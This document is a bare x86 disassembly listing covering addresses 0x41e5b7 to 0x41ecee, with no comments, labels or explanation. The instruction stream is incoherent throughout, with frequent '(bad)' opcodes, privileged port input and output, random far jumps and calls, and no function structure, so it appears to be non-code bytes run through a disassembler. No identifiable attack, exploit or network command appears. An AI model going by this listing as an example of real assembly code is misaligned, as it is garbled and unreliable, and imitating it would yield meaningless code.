  41e5b7:	add    eax,0xbcf7a395
  41e5bc:	call   FWORD PTR [esi]
  41e5be:	cmp    eax,0xd4d3ae1e
  41e5c3:	outs   dx,BYTE PTR ds:[esi]
  41e5c4:	xchg   BYTE PTR [si],al
  41e5c7:	rcr    BYTE PTR [esp+esi*8+0x1ecf57f4],0xfd
  41e5cf:	mov    ds:0x2bf9b1df,al
  41e5d4:	xchg   ebx,eax
  41e5d5:	mov    edx,0x2d7dc70a
  41e5da:	lea    eax,[ecx]
  41e5dc:	pop    ebp
  41e5dd:	popa   
  41e5de:	dec    ebp
  41e5df:	leave  
  41e5e0:	and    eax,0xd74064da
  41e5e5:	ret    
  41e5e6:	adc    ah,BYTE PTR [ebx+eax*4-0x2d]
  41e5ea:	out    0xd7,al
  41e5ec:	mov    ds:0xf1017af3,al
  41e5f1:	fistp  QWORD PTR [edx+eax*8+0x10]
  41e5f5:	ret    
  41e5f6:	pop    esi
  41e5f7:	mov    WORD PTR [eax+0x57e9af94],?
  41e5fd:	loopne 0x41e666
  41e5ff:	jbe    0x41e60f
  41e601:	in     eax,dx
  41e602:	sbb    DWORD PTR [eax],esi
  41e604:	out    dx,eax
  41e605:	outs   dx,DWORD PTR ds:[esi]
  41e606:	outs   dx,BYTE PTR ds:[esi]
  41e607:	call   0x80fc34ac
  41e60c:	jmp    0x5cf9:0x49ed4099
  41e613:	pop    esi
  41e614:	xlat   BYTE PTR ds:[ebx]
  41e615:	sub    eax,0xf2b79f79
  41e61a:	outs   dx,BYTE PTR ds:[esi]
  41e61b:	ror    DWORD PTR [edi],1
  41e61d:	test   al,0x7c
  41e61f:	cli    
  41e620:	call   0x9322830a
  41e625:	mov    ch,dh
  41e627:	jns    0x41e634
  41e629:	retf   
  41e62a:	imul   edx,DWORD PTR [edx+0x27dc1057],0xfa97db17
  41e634:	mov    edi,0x1c23d6a6
  41e639:	in     al,dx
  41e63a:	test   BYTE PTR [esi*8+0x714b44b0],cl
  41e641:	stc    
  41e642:	jg     0x41e65f
  41e644:	je     0x41e64c
  41e646:	mov    ds:0xf5db0d48,al
  41e64b:	adc    ebx,ecx
  41e64d:	mov    dh,0x8d
  41e64f:	jnp    0x41e6c3
  41e651:	mov    es,WORD PTR [ecx]
  41e653:	jno    0x41e611
  41e655:	add    ebp,esp
  41e657:	cld    
  41e658:	mov    edi,0xd73ee92
  41e65d:	imul   esp,DWORD PTR [edi+eiz*8-0x3b65247e],0x6d
  41e665:	push   es
  41e666:	lea    esi,[eax]
  41e668:	mov    eax,cs
  41e66a:	fwait
  41e66b:	add    ebx,DWORD PTR [edi-0x75]
  41e66e:	dec    esi
  41e66f:	je     0x41e6ce
  41e671:	sbb    BYTE PTR [esi+0x299f5080],al
  41e677:	rol    BYTE PTR [ebx+0x5e],0xa1
  41e67b:	clc    
  41e67c:	add    ecx,eax
  41e67e:	mov    esi,0xd99eea92
  41e683:	dec    esp
  41e684:	mov    ecx,0x6c904c55
  41e689:	enter  0x7e10,0x2a
  41e68d:	inc    ch
  41e68f:	and    edi,0x14
  41e692:	mov    al,ds:0x1144ab46
  41e697:	hlt    
  41e698:	clc    
  41e699:	and    al,0xfd
  41e69b:	mov    al,0x46
  41e69d:	sti    
  41e69e:	pop    esi
  41e69f:	sub    DWORD PTR [eax-0x4eaf9009],esp
  41e6a5:	mov    dh,0xbd
  41e6a7:	imul   edx,esi,0x6024e9f
  41e6ad:	addr16 or eax,0x12d2ad35
  41e6b3:	inc    eax
  41e6b4:	dec    ecx
  41e6b5:	xchg   esp,eax
  41e6b6:	in     eax,0x5e
  41e6b8:	jp     0x41e63c
  41e6ba:	data16 cld 
  41e6bc:	sub    DWORD PTR [edi-0x4f],esi
  41e6bf:	cmp    cl,ah
  41e6c1:	inc    ecx
  41e6c2:	(bad)  
  41e6c3:	xor    DWORD PTR [edx+0x7c5d7b43],esp
  41e6c9:	(bad)  
  41e6ca:	cld    
  41e6cb:	inc    edi
  41e6cc:	cwde   
  41e6cd:	add    ah,al
  41e6cf:	sti    
  41e6d0:	jnp    0x41e6d7
  41e6d2:	and    al,0xa5
  41e6d4:	mov    ecx,0x41953968
  41e6d9:	add    bl,BYTE PTR [edx+0x4a]
  41e6dc:	repz mov ecx,0xc12169f5
  41e6e2:	sub    ch,BYTE PTR [esi+eax*2+0x27]
  41e6e6:	js     0x41e6c2
  41e6e8:	sbb    eax,0xe7cc3c8
  41e6ed:	pop    ds
  41e6ee:	jl     0x41e73a
  41e6f0:	fstp   TBYTE PTR [eax-0x40]
  41e6f3:	pop    edi
  41e6f4:	cmc    
  41e6f5:	arpl   WORD PTR [ebp+0x26],cx
  41e6f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6f9:	pop    edx
  41e6fa:	xchg   ebx,eax
  41e6fb:	je     0x41e739
  41e6fd:	in     al,0xcf
  41e6ff:	outs   dx,BYTE PTR ds:[esi]
  41e700:	mov    dl,0x7c
  41e702:	lock dec ebx
  41e704:	push   ebx
  41e705:	mul    DWORD PTR [eax-0x44]
  41e708:	mov    edi,DWORD PTR [edx+0x7e4bde3e]
  41e70e:	and    eax,0x54d1946c
  41e713:	daa    
  41e714:	or     ecx,ebx
  41e716:	dec    esi
  41e717:	cld    
  41e718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e719:	mov    esi,0x6242b625
  41e71e:	fldenv [edi+0x19]
  41e721:	push   ss
  41e722:	jb     0x41e6f8
  41e724:	ret    0xba7c
  41e727:	fbld   TBYTE PTR [edx]
  41e729:	out    dx,eax
  41e72a:	push   ds
  41e72b:	lahf   
  41e72c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e72d:	stos   DWORD PTR es:[edi],eax
  41e72e:	add    eax,0x8b99dccd
  41e733:	lock je 0x41e6c1
  41e736:	sbb    esp,DWORD PTR [edi]
  41e738:	rcr    DWORD PTR [ecx-0x7a],1
  41e73b:	sub    esi,esp
  41e73d:	xchg   esp,eax
  41e73e:	cld    
  41e73f:	xchg   esi,eax
  41e740:	or     al,0x8c
  41e742:	shl    BYTE PTR [ebx],1
  41e744:	pop    esp
  41e745:	mov    BYTE PTR [eax+0x12],cl
  41e748:	dec    ebx
  41e749:	(bad)  
  41e74a:	(bad)  
  41e74b:	std    
  41e74c:	pop    eax
  41e74d:	xor    al,0x39
  41e74f:	cdq    
  41e750:	bnd jmp 0x41e73d
  41e753:	pop    edx
  41e754:	add    al,0x4e
  41e756:	fldz   
  41e758:	stos   DWORD PTR es:[edi],eax
  41e759:	iret   
  41e75a:	dec    ecx
  41e75b:	out    dx,al
  41e75c:	adc    bl,cl
  41e75e:	mov    dh,0xa5
  41e760:	cmp    BYTE PTR [ebp-0x44],al
  41e763:	lods   al,BYTE PTR ds:[esi]
  41e764:	push   0x65
  41e766:	mov    esp,0xb440c34a
  41e76b:	xchg   ebx,ebx
  41e76d:	cmp    BYTE PTR ds:0x8b67df2,dl
  41e773:	pop    es
  41e774:	ret    
  41e775:	ret    0x87ff
  41e778:	fidiv  DWORD PTR [edi+eiz*8-0x25]
  41e77c:	ins    BYTE PTR es:[edi],dx
  41e77d:	(bad)  
  41e77e:	mov    edi,0x9f6e8220
  41e783:	je     0x41e79d
  41e785:	bound  eax,QWORD PTR [ebx]
  41e787:	nop
  41e788:	(bad)  
  41e789:	pop    esp
  41e78a:	mov    edi,0x7f16f9c9
  41e78f:	iret   
  41e790:	jg     0x41e73d
  41e792:	std    
  41e793:	(bad)  
  41e795:	fwait
  41e796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e797:	sbb    bh,BYTE PTR [edx-0x3b]
  41e79a:	(bad)  
  41e79d:	call   0xe73b:0xd4baaa1d
  41e7a4:	push   cs
  41e7a5:	sbb    al,0x94
  41e7a7:	pop    ds
  41e7a8:	(bad)  
  41e7a9:	test   DWORD PTR [esi-0x5799d354],esp
  41e7af:	cs sub eax,0x9df9607d
  41e7b5:	pusha  
  41e7b6:	ins    BYTE PTR es:[edi],dx
  41e7b7:	xchg   ebp,eax
  41e7b8:	push   edi
  41e7b9:	shr    DWORD PTR [eax],cl
  41e7bb:	in     al,dx
  41e7bc:	mov    esi,0x91d34557
  41e7c1:	outs   dx,DWORD PTR ds:[esi]
  41e7c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7c3:	(bad)  
  41e7c4:	cmc    
  41e7c5:	shl    DWORD PTR [ebp-0x18],cl
  41e7c8:	fmulp  st(3),st
  41e7ca:	stc    
  41e7cb:	xor    DWORD PTR cs:[edx+0x5],0xffffffba
  41e7d0:	repz xor al,0x4e
  41e7d3:	daa    
  41e7d4:	scas   eax,DWORD PTR es:[edi]
  41e7d5:	jmp    0xda52:0xa84036a7
  41e7dc:	or     eax,0x92d6b02f
  41e7e1:	and    bh,BYTE PTR [eax+0x651c8849]
  41e7e7:	mov    fs,WORD PTR [ebx+0x2a117ba0]
  41e7ed:	leave  
  41e7ee:	or     ah,BYTE PTR [ecx+eax*4+0x7a]
  41e7f2:	pop    esp
  41e7f3:	rcl    BYTE PTR [esi],cl
  41e7f5:	mov    al,0xac
  41e7f7:	mov    eax,0x1f58da4f
  41e7fc:	ds popa 
  41e7fe:	lds    ebx,FWORD PTR [ecx]
  41e800:	shr    DWORD PTR [esi+0x18],cl
  41e803:	mov    eax,ds:0xbccd1583
  41e808:	xchg   DWORD PTR [ecx+0x2f],eax
  41e80b:	daa    
  41e80c:	xchg   edi,eax
  41e80d:	rol    ebp,cl
  41e80f:	fcom   DWORD PTR [ebx+0x232fefa4]
  41e815:	out    0xb4,al
  41e817:	mov    ds:0xbf35e8,eax
  41e81c:	mov    esi,0x5992488b
  41e821:	mov    esi,0x19697d3b
  41e826:	inc    esi
  41e827:	mov    ebx,0x4f568335
  41e82c:	es (bad) 
  41e82e:	cmp    dh,bh
  41e830:	int3   
  41e831:	scas   eax,DWORD PTR es:[edi]
  41e832:	cdq    
  41e833:	jg     0x41e837
  41e835:	inc    eax
  41e836:	scas   eax,DWORD PTR es:[edi]
  41e837:	fnstsw WORD PTR [ecx+eiz*1+0xf]
  41e83b:	(bad)  [edx]
  41e83d:	push   cs
  41e83e:	ret    0x1189
  41e841:	sub    al,0x1a
  41e843:	fwait
  41e844:	ins    DWORD PTR es:[edi],dx
  41e845:	jmp    0xf5f7b659
  41e84a:	and    al,0x28
  41e84c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e84d:	out    0x30,al
  41e84f:	jecxz  0x41e89e
  41e851:	cmp    al,0x5a
  41e853:	xchg   esi,eax
  41e854:	in     eax,dx
  41e855:	mov    ds:0xd633c45d,al
  41e85a:	dec    esp
  41e85b:	in     al,0xfa
  41e85d:	je     0x41e83b
  41e85f:	push   ebx
  41e860:	mov    ds:0xf8c5dd02,al
  41e865:	sbb    ah,cl
  41e867:	div    BYTE PTR [eax+0x5ee0701]
  41e86d:	cld    
  41e86e:	mov    edx,DWORD PTR [ecx+edi*8+0x5c]
  41e872:	arpl   cx,di
  41e874:	jp     0x41e8a1
  41e876:	dec    edx
  41e877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e878:	loopne 0x41e816
  41e87a:	retf   
  41e87b:	lea    eax,[eax-0x69]
  41e87e:	push   0xffffff8b
  41e880:	inc    esp
  41e881:	imul   DWORD PTR [ecx+0x20a952a]
  41e887:	dec    esp
  41e888:	push   es
  41e889:	je     0x41e884
  41e88b:	push   es
  41e88c:	in     al,0x84
  41e88e:	into   
  41e88f:	(bad)  
  41e890:	jno    0x41e834
  41e892:	sahf   
  41e893:	popf   
  41e894:	xchg   ebx,eax
  41e895:	mov    al,0x6f
  41e897:	scas   eax,DWORD PTR es:[edi]
  41e898:	icebp  
  41e899:	shl    DWORD PTR [ecx-0x1296004],0x56
  41e8a0:	loopne 0x41e8c3
  41e8a2:	int3   
  41e8a3:	and    dh,BYTE PTR [esi]
  41e8a5:	xchg   DWORD PTR [ebx+edx*2+0x5b],eax
  41e8a9:	loopne 0x41e893
  41e8ab:	push   ebp
  41e8ac:	inc    ebx
  41e8ad:	addr16 push ds
  41e8af:	repz dec ebp
  41e8b1:	int3   
  41e8b2:	or     eax,0x6b2c26e0
  41e8b7:	jne    0x41e8c2
  41e8b9:	mov    ebx,fs
  41e8bb:	repnz pop ss
  41e8bd:	pop    ebp
  41e8be:	es mov ss,edi
  41e8c1:	inc    edx
  41e8c2:	xchg   ebx,eax
  41e8c3:	pop    ecx
  41e8c4:	popa   
  41e8c5:	sbb    DWORD PTR [ebx+0x192ace54],0xd523956d
  41e8cf:	cmc    
  41e8d0:	push   edi
  41e8d1:	imul   ecx,DWORD PTR ds:0xf04ce88a,0x9
  41e8d8:	push   esi
  41e8da:	pop    ecx
  41e8db:	retf   0x46f
  41e8de:	(bad)  
  41e8df:	ins    DWORD PTR es:[edi],dx
  41e8e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8e1:	or     eax,esp
  41e8e3:	inc    edx
  41e8e4:	pop    ss
  41e8e5:	enter  0x8a1,0xc0
  41e8e9:	inc    ebx
  41e8ea:	outs   dx,BYTE PTR ds:[esi]
  41e8eb:	add    ch,bh
  41e8ed:	(bad)  [edi+0x4eb3d28e]
  41e8f3:	lahf   
  41e8f4:	mov    cl,0x87
  41e8f6:	loop   0x41e8ce
  41e8f8:	(bad)  
  41e8f9:	(bad)  
  41e8fa:	fsubr  DWORD PTR [edx]
  41e8fc:	lds    ebx,FWORD PTR [eax-0x1c]
  41e8ff:	fadd   DWORD PTR [ecx+esi*2+0x25464c88]
  41e906:	jb     0x41e8cc
  41e908:	push   esp
  41e909:	lods   al,BYTE PTR ds:[esi]
  41e90a:	mov    ss,WORD PTR [ecx+0x24]
  41e90d:	mov    bl,BYTE PTR [edx+0x7cdd3b77]
  41e913:	stc    
  41e914:	(bad)  
  41e915:	jno    0x41e985
  41e917:	inc    esi
  41e918:	retf   
  41e919:	call   0xff38:0xf7ceff0b
  41e920:	cmp    al,0x7d
  41e922:	inc    ebp
  41e923:	jb     0x41e8f3
  41e925:	test   BYTE PTR [esi],0x8d
  41e928:	shl    dl,cl
  41e92a:	dec    ebx
  41e92b:	(bad)  
  41e92c:	fmul   QWORD PTR [esi-0x4f]
  41e92f:	sbb    ah,BYTE PTR [ebp-0x30]
  41e932:	enter  0x74c7,0x66
  41e936:	mov    ch,0x2c
  41e938:	lods   al,BYTE PTR ds:[esi]
  41e939:	pop    eax
  41e93a:	ja     0x41e982
  41e93c:	(bad)  
  41e93d:	cmp    BYTE PTR [edx],ch
  41e93f:	push   esi
  41e940:	and    eax,esi
  41e942:	or     al,0x83
  41e944:	jns    0x41e907
  41e946:	jg     0x41e92c
  41e948:	xor    DWORD PTR [eax+ecx*1],ebx
  41e94b:	ret    0x8cea
  41e94e:	inc    ebp
  41e94f:	inc    ebp
  41e950:	sbb    DWORD PTR [edx+0xcf64121],ecx
  41e956:	xchg   ebp,eax
  41e957:	sbb    esp,DWORD PTR [eax]
  41e959:	sbb    al,0x9
  41e95b:	shl    ecx,0x99
  41e95e:	push   ebx
  41e95f:	pop    DWORD PTR [edi-0x15979267]
  41e965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e966:	sub    BYTE PTR [edi-0x5fea69a2],cl
  41e96c:	and    al,0x41
  41e96e:	mov    ds:0xa3cb051a,al
  41e973:	xchg   edi,eax
  41e974:	call   0x99a529ce
  41e979:	adc    al,0xdc
  41e97b:	pop    ds
  41e97c:	adc    eax,0x7442ee3a
  41e981:	fstp   DWORD PTR [edi]
  41e983:	dec    esp
  41e984:	out    dx,al
  41e985:	mov    WORD PTR [ebx],gs
  41e987:	aad    0xef
  41e989:	jp     0x41e9d6
  41e98b:	leave  
  41e98c:	dec    edi
  41e98d:	push   0x9f3cf643
  41e992:	(bad)  
  41e993:	out    0x10,eax
  41e995:	data16 jg 0x41e9a2
  41e998:	push   0xffffffa1
  41e99a:	aam    0x92
  41e99c:	loopne 0x41e946
  41e99e:	fwait
  41e99f:	retf   
  41e9a0:	pop    esi
  41e9a1:	imul   esi,DWORD PTR [edi+edx*8+0x6e],0xd64df80d
  41e9a9:	mov    ebx,0xb407ecfa
  41e9ae:	mov    esp,0xb2040bf1
  41e9b3:	and    ch,BYTE PTR [ecx-0x4e]
  41e9b6:	pop    ds
  41e9b7:	jbe    0x41e9aa
  41e9b9:	pop    esp
  41e9ba:	push   edi
  41e9bb:	xchg   ebx,eax
  41e9bc:	push   edi
  41e9bd:	or     eax,DWORD PTR [edx+0x6a329cf7]
  41e9c3:	call   0xdff971fe
  41e9c8:	sub    al,0xe
  41e9ca:	(bad)  
  41e9cb:	into   
  41e9cc:	lock push 0x2
  41e9cf:	and    eax,ecx
  41e9d1:	sub    BYTE PTR [edx+0x24],ah
  41e9d4:	xchg   BYTE PTR [eax],ch
  41e9d6:	fidivr DWORD PTR [edi]
  41e9d8:	out    0xd2,eax
  41e9da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9db:	cwde   
  41e9dc:	sbb    BYTE PTR [ebp-0x2e2ad4d5],ch
  41e9e2:	fisttp DWORD PTR [eax-0x2d]
  41e9e5:	xlat   BYTE PTR gs:[ebx]
  41e9e7:	fbstp  TBYTE PTR [ebx]
  41e9e9:	mov    esp,0xec15c36f
  41e9ee:	or     BYTE PTR [edx+esi*4],ah
  41e9f1:	jle    0x41e979
  41e9f3:	xchg   ebp,eax
  41e9f4:	sti    
  41e9f5:	jl     0x41ea67
  41e9f7:	imul   esp,DWORD PTR [eax],0x7d0a3793
  41e9fd:	and    eax,DWORD PTR [edx-0x4479a3d7]
  41ea03:	push   0x2f
  41ea05:	fdiv   QWORD PTR [ebx+eiz*4]
  41ea08:	xor    ebx,DWORD PTR [edx-0x3c]
  41ea0b:	jmp    0x41ea57
  41ea0d:	stc    
  41ea0e:	bound  ecx,QWORD PTR [ecx-0x49a447c6]
  41ea14:	xor    BYTE PTR [esi],bh
  41ea16:	rcr    DWORD PTR [esi+0x9fc3b42],1
  41ea1c:	retf   
  41ea1d:	in     al,0xf0
  41ea1f:	repz dec edi
  41ea21:	xchg   edi,eax
  41ea22:	ret    0x77d9
  41ea25:	out    dx,eax
  41ea26:	or     al,0xc5
  41ea28:	push   ds
  41ea29:	pop    esp
  41ea2a:	cmp    bh,cl
  41ea2c:	addr16 mov ebp,0x18723f34
  41ea32:	ins    BYTE PTR es:[edi],dx
  41ea33:	adc    BYTE PTR [edi+edi*2],0x73
  41ea37:	into   
  41ea38:	ins    BYTE PTR es:[edi],dx
  41ea39:	fsub   QWORD PTR [esi+0x58]
  41ea3c:	(bad)  
  41ea3d:	and    eax,0x94056903
  41ea42:	out    0x35,al
  41ea44:	call   0x57c1:0xb9dc0084
  41ea4b:	rol    BYTE PTR [ebx],0xb6
  41ea4e:	outs   dx,DWORD PTR ds:[esi]
  41ea4f:	loop   0x41e9ee
  41ea51:	xor    eax,0x376e1d1c
  41ea56:	inc    ebx
  41ea57:	mov    dl,0x7a
  41ea59:	dec    edi
  41ea5a:	sub    al,0x7e
  41ea5c:	add    bh,bh
  41ea5e:	mov    al,0xfa
  41ea60:	mov    fs,WORD PTR ds:0x4a91d256
  41ea66:	mov    ebp,0xc7e7bc7f
  41ea6b:	jo     0x41ea47
  41ea6d:	loopne 0x41ea8d
  41ea6f:	xchg   ecx,eax
  41ea70:	push   cs
  41ea71:	jno    0x41ea84
  41ea73:	pop    ds
  41ea74:	mov    ch,0xd3
  41ea76:	das    
  41ea77:	rol    edi,1
  41ea79:	inc    ecx
  41ea7a:	sbb    eax,eax
  41ea7c:	jmp    0x9f89de23
  41ea81:	inc    edx
  41ea82:	aam    0x6f
  41ea84:	outs   dx,DWORD PTR ds:[esi]
  41ea85:	in     al,0xa4
  41ea87:	cmp    al,0xd7
  41ea89:	cmc    
  41ea8a:	ja     0x41eaeb
  41ea8c:	pusha  
  41ea8d:	adc    eax,0xacd190c9
  41ea92:	xor    eax,0xbb181e3d
  41ea97:	cvttps2pi mm4,QWORD PTR [edx+0xdd75a11]
  41ea9e:	mov    al,0xc6
  41eaa0:	cmp    DWORD PTR [eax*1+0x5bc5a09d],eax
  41eaa7:	cmp    BYTE PTR [ecx-0x5f],bl
  41eaaa:	aas    
  41eaab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eaac:	stc    
  41eaad:	sbb    eax,0xc3a2fe37
  41eab3:	das    
  41eab4:	sbb    eax,0x72c37628
  41eab9:	jmp    0x41eb1b
  41eabb:	push   ebx
  41eabc:	cmp    ebp,DWORD PTR [ecx]
  41eabe:	or     BYTE PTR [esi-0x476668],0x54
  41eac5:	ror    eax,cl
  41eac7:	mov    esp,esi
  41eac9:	bound  edx,QWORD PTR [edx]
  41eacb:	ss ds cli 
  41eace:	cdq    
  41eacf:	jo     0x41eadc
  41ead1:	aad    0x42
  41ead3:	jnp    0x41ea74
  41ead5:	lahf   
  41ead6:	adc    ah,BYTE PTR [edi+0x3c]
  41ead9:	pop    ss
  41eada:	icebp  
  41eadb:	or     eax,esp
  41eadd:	dec    ecx
  41eade:	jge    0x41eb06
  41eae0:	inc    eax
  41eae1:	mov    eax,esp
  41eae3:	aaa    
  41eae4:	mov    edi,0x8aa1f3cd
  41eae9:	mov    dl,0xc0
  41eaeb:	ror    BYTE PTR [ecx-0x53c38b06],1
  41eaf1:	jbe    0x41eb4d
  41eaf3:	js     0x41ea81
  41eaf5:	hlt    
  41eaf6:	mov    ebx,DWORD PTR [eax]
  41eaf8:	outs   dx,BYTE PTR ds:[esi]
  41eaf9:	push   0xd31d4e0e
  41eafe:	rol    BYTE PTR [esp+edi*8],1
  41eb01:	in     eax,0x14
  41eb03:	dec    ebx
  41eb04:	sbb    al,0x40
  41eb06:	aad    0x67
  41eb08:	cld    
  41eb09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb0a:	sbb    ah,al
  41eb0c:	daa    
  41eb0d:	or     DWORD PTR [ecx+esi*1-0x1221fc98],esp
  41eb14:	push   ds
  41eb15:	or     ebp,0x2e15ad84
  41eb1b:	icebp  
  41eb1c:	daa    
  41eb1d:	dec    edi
  41eb1e:	pop    edx
  41eb1f:	pop    ebp
  41eb20:	cmp    BYTE PTR [esi+0x2bbfac84],bl
  41eb26:	loop   0x41eb4d
  41eb28:	xchg   edi,eax
  41eb29:	push   DWORD PTR [ebp+0x3df99cf8]
  41eb2f:	jns    0x41eaf1
  41eb31:	loope  0x41eb31
  41eb33:	sbb    ecx,edi
  41eb35:	jae    0x41eb30
  41eb37:	fdivr  DWORD PTR ds:0x588a4279
  41eb3d:	cmp    DWORD PTR [eax-0x571f3f36],edx
  41eb43:	push   es
  41eb44:	cmc    
  41eb45:	ret    
  41eb46:	stos   BYTE PTR es:[edi],al
  41eb47:	pop    esi
  41eb48:	xchg   ecx,eax
  41eb49:	add    DWORD PTR [edi-0x33],0xfffffffb
  41eb4d:	dec    ecx
  41eb4e:	push   0xf856d92c
  41eb53:	sbb    DWORD PTR [edx+eiz*1-0x77e1dd1f],ebx
  41eb5a:	ficomp DWORD PTR [edx+0x2c0eeddb]
  41eb60:	mov    bh,0xa7
  41eb62:	jbe    0x41eb70
  41eb64:	add    al,0x72
  41eb66:	mov    bh,0x19
  41eb68:	push   edx
  41eb69:	pusha  
  41eb6a:	popa   
  41eb6b:	fsubr  DWORD PTR [ebp+0x16]
  41eb6e:	daa    
  41eb6f:	fstp   QWORD PTR [ebp+0x61]
  41eb72:	sbb    eax,0xa5afe9bb
  41eb77:	pop    eax
  41eb78:	cld    
  41eb79:	xchg   edi,eax
  41eb7a:	(bad)  
  41eb7b:	sub    BYTE PTR [eax-0x57838a9c],cl
  41eb81:	lods   eax,DWORD PTR ds:[esi]
  41eb82:	fldenv [edi]
  41eb84:	hlt    
  41eb85:	xor    eax,0xd35680ba
  41eb8a:	popa   
  41eb8b:	inc    ebx
  41eb8c:	adc    BYTE PTR [ecx+0x16],cl
  41eb8f:	retf   
  41eb90:	xlat   BYTE PTR ds:[ebx]
  41eb91:	inc    esi
  41eb92:	or     BYTE PTR [esi],ch
  41eb94:	cmc    
  41eb95:	xchg   edi,eax
  41eb96:	pusha  
  41eb97:	rcl    BYTE PTR [ecx],1
  41eb99:	pop    ecx
  41eb9a:	imul   edi,DWORD PTR [ecx],0xfacea815
  41eba0:	mov    al,0xde
  41eba2:	outs   dx,BYTE PTR ds:[esi]
  41eba3:	inc    ecx
  41eba4:	pop    edx
  41eba5:	into   
  41eba6:	pop    ds
  41eba7:	mov    ch,0x16
  41eba9:	mov    esi,0xadbc64c3
  41ebae:	jmp    0x38f2db21
  41ebb3:	pop    ebp
  41ebb4:	int3   
  41ebb5:	hlt    
  41ebb6:	imul   esi,edi,0x43
  41ebb9:	inc    ecx
  41ebba:	mov    WORD PTR [edx-0x5],?
  41ebbd:	ffreep st(6)
  41ebbf:	stc    
  41ebc0:	sbb    DWORD PTR ds:0xafd80006,edx
  41ebc6:	jecxz  0x41ebc7
  41ebc8:	das    
  41ebc9:	xchg   edx,eax
  41ebca:	das    
  41ebcb:	leave  
  41ebcc:	mov    esi,0xd699acea
  41ebd1:	and    DWORD PTR [edx],ebp
  41ebd3:	dec    edx
  41ebd4:	fbld   TBYTE PTR [edx+0x43a152]
  41ebda:	sbb    eax,0x5c1adc71
  41ebdf:	cmc    
  41ebe0:	cli    
  41ebe1:	ret    0xb32e
  41ebe4:	mov    edi,0xbf42b710
  41ebe9:	jns    0x41ec60
  41ebeb:	add    DWORD PTR [ebx-0x2193f590],0x7c
  41ebf2:	repnz xor ch,cl
  41ebf5:	popa   
  41ebf6:	test   BYTE PTR [ecx+0x18cf6471],bl
  41ebfc:	dec    edi
  41ebfd:	ins    DWORD PTR es:[edi],dx
  41ebfe:	mov    dh,0x2c
  41ec00:	add    al,0xac
  41ec02:	jge    0x41ec50
  41ec04:	inc    esp
  41ec05:	data16 outs dx,BYTE PTR ds:[esi]
  41ec07:	fild   DWORD PTR ss:[eax+0xb]
  41ec0b:	outs   dx,BYTE PTR ds:[esi]
  41ec0c:	(bad)  
  41ec0d:	sbb    DWORD PTR [esp+edi*8],ebx
  41ec10:	and    BYTE PTR [ecx+0x73ea69ad],bl
  41ec16:	adc    al,BYTE PTR [ecx-0x24dc1654]
  41ec1c:	mov    al,ds:0xbd04eee
  41ec21:	fsub   DWORD PTR [esi]
  41ec23:	daa    
  41ec24:	add    al,0x45
  41ec26:	and    BYTE PTR [ebp+0x4b],dh
  41ec29:	xor    eax,0x721b1d05
  41ec2e:	pmaxub mm1,QWORD PTR [ebp-0x2d]
  41ec32:	adc    al,0x23
  41ec34:	std    
  41ec35:	mov    ecx,0xc3940eb5
  41ec3a:	mov    ebx,0xf0fbdb1e
  41ec3f:	or     DWORD PTR ds:0x8c6fe87c,esp
  41ec45:	xlat   BYTE PTR ds:[ebx]
  41ec46:	and    bl,BYTE PTR [eax+0x13acf1fa]
  41ec4c:	sub    eax,0xe02834ee
  41ec51:	out    0xb1,eax
  41ec53:	or     ebx,DWORD PTR [ebp-0x3e]
  41ec56:	or     BYTE PTR [ebx],bh
  41ec58:	imul   DWORD PTR [eax]
  41ec5a:	bnd jge 0x41ec09
  41ec5d:	adc    al,0x7
  41ec5f:	(bad)  
  41ec61:	and    edi,0xffffffd1
  41ec64:	(bad)  
  41ec65:	out    dx,eax
  41ec66:	jg     0x41ec23
  41ec68:	cld    
  41ec69:	inc    edx
  41ec6a:	imul   esp,DWORD PTR [ebx+0x68],0x4e
  41ec6e:	cmp    dh,BYTE PTR [esi-0x12]
  41ec71:	int    0x5c
  41ec73:	pop    es
  41ec74:	out    dx,al
  41ec75:	popf   
  41ec76:	aas    
  41ec77:	dec    edx
  41ec78:	ja     0x41ec3a
  41ec7a:	push   ebx
  41ec7b:	push   eax
  41ec7c:	xor    al,0x50
  41ec7e:	out    dx,al
  41ec7f:	xlat   BYTE PTR ds:[ebx]
  41ec80:	dec    edi
  41ec81:	xor    dh,0xda
  41ec84:	cs (bad) 
  41ec86:	sub    edx,DWORD PTR [edx-0x40]
  41ec89:	cmp    eax,0xc0b006c0
  41ec8e:	mov    WORD PTR [eax],cs
  41ec90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec91:	not    DWORD PTR [edx]
  41ec93:	push   eax
  41ec94:	in     eax,0xec
  41ec96:	je     0x41ec51
  41ec98:	dec    edi
  41ec99:	arpl   WORD PTR [ebx+0xad2a2e8],cx
  41ec9f:	cmp    eax,0xb7730166
  41eca4:	push   0x57
  41eca6:	stos   DWORD PTR es:[edi],eax
  41eca7:	cmp    eax,0x9a153618
  41ecac:	lea    ecx,[ecx+0x37]
  41ecaf:	loope  0x41ecb1
  41ecb1:	xor    ebp,DWORD PTR [edi+0x4ae71d66]
  41ecb7:	push   ebp
  41ecb8:	dec    edi
  41ecb9:	xchg   edx,eax
  41ecba:	jno    0x41ecfc
  41ecbc:	es iret 
  41ecbe:	and    al,0x89
  41ecc0:	test   DWORD PTR [ebx+0x21],ebp
  41ecc3:	mov    eax,ds:0x4ad4343f
  41ecc8:	inc    eax
  41ecc9:	loopne 0x41ecbb
  41eccb:	jmp    0xe511edde
  41ecd0:	outs   dx,DWORD PTR ds:[esi]
  41ecd1:	mov    eax,0xfd5356cc
  41ecd6:	or     DWORD PTR gs:[edx-0x7d5ee302],ebp
  41ecdd:	xchg   esi,eax
  41ecde:	add    al,0x7f
  41ece0:	xchg   ebx,eax
  41ece1:	mov    dh,0x62
  41ece3:	dec    esi
  41ece4:	jo     0x41ed37
  41ece6:	cmp    BYTE PTR [ecx-0x387244f7],cl
  41ecec:	and    eax,ebx
  41ecee:	cs inc edx
